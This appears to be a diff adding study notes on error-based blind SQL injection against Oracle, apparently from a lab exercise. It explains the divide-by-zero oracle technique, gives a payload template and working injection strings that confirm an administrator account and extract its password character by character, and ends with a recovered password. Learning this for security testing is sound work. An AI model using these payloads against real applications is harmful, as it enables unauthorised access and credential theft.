@@ -1,0 +1,33 @@
+🔍 The Core Idea (Simplified):
+You're going to:
+
+Write a SQL condition.
+
+If the condition is true, you force a database error (like divide by 0).
+
+Watch how the app behaves.
+
+If it errors → the condition was true
+
+If it loads normally → the condition was false
+
+This way, you can find out secret data (like a password) one letter at a time — without seeing the actual data.
+
+🧠 Think of it like this:
+You're asking the app:
+
+"Hey app, is the first letter of the admin’s password greater than 'm'? If yes, then CRASH the DB (1/0). If no, just return 'a'."
+
+And then you watch if the app breaks.
+
+
+PAYLOAD !!(DEFAULT)
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+
+WORKING PAYLOAD
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator') > 0 THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
+' AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
+
+' AND (SELECT CASE WHEN SUBSTR((select password from users where username='administrator'),1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
+
+Password is = rh1al9bjrkcpcf7lzq21
